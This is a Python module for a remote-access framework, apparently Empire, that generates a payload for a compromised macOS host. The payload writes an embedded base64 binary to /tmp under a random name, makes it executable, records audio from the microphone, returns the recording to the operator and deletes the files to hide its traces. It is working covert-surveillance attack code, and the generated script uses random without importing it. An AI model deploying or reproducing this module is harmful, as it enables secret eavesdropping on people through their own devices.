import os
import base64

class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'osx_mic_record',

            # List of one or more authors for the module
            'Author': ['@s0lst1c3'],

            # More verbose multi-line description of the module
            'Description': ('Records audio through the MacOS webcam mic '
                            'using a custom binary that interacts directly '
                            'with the Apple AVFoundation API.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            #   no need to base64 return data
            'OutputExtension': 'caf',

            # True if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # The module language
            'Language' : 'python',

            # The minimum language version needed
            'MinLanguageVersion' : '2.6',

            # List of any references/other comments
            'Comments': [
                (
                    'Source code for custom binary: '
                    'https://github.com/s0lst1c3/osx_mic_record'
                ),
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab a screenshot from.',
                'Required'      :   True,
                'Value'         :   '',
            },
            'OutputDir': {
                'Description'   :   ('Directory on remote machine '
                                     'in which all binary content '
                                     'should be saved. (Default: /tmp)'),
                'Required'      :   False,
                'Value'         :   '/tmp',
            },
            'RecordTime': {
                'Description'   :   ('The length of the audio recording '
                                     'in seconds. (Default: 5)'),
                'Required'      :   False,
                'Value'         :   '5',
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=''):

        output_dir = self.options['OutputDir']['Value']
        record_time = self.options['RecordTime']['Value']
        osx_mic_record_bin = os.path.join(
                        self.mainMenu.installPath,
                        'data/misc/osx_mic_record_bin',
        )
        with open(osx_mic_record_bin, 'rb') as input_handle:
            osx_mic_record_b64 = base64.b64encode(input_handle.read())

        return '''
import os
import base64
import string

# setable option parameter are set here
output_dir = '%s'
record_time = '%s'
osx_mic_record_b64 = '%s'

if __name__ == '__main__':

    # generate path for osx_mic_record_bin
    osx_mic_record_bin = ''.join(random.choice(
                string.ascii_letters) for _ in range(32))
    osx_mic_record_bin = os.path.join(output_dir, osx_mic_record_bin)

    # generate path for saved audio output
    output_file = ''.join(random.choice(
                string.ascii_letters) for _ in range(32))
    output_file = os.path.join(output_dir, output_file)

    # save the osx_mic_record_b64 to disk as a binary file and make executable
    with open(osx_mic_record_bin, 'wb') as output_handle:
        output_handle.write(base64.b64decode(osx_mic_record_b64))
    run_command('chmod 777 ' + osx_mic_record_bin)

    # record for n seconds
    run_command(' '.join([osx_mic_record_bin, record_time, output_file]))

    # retrieve content from output file then delete it
    with open(output_file, 'rb') as input_handle:
        captured_audio = input_handle.read()
    run_command('rm -f ' + output_file)

    # delete osx_mic_record_bin
    run_command('rm -f ' + osx_mic_record_bin)

    print captured_audio
    
''' % (output_dir, record_time, osx_mic_record_b64) # script
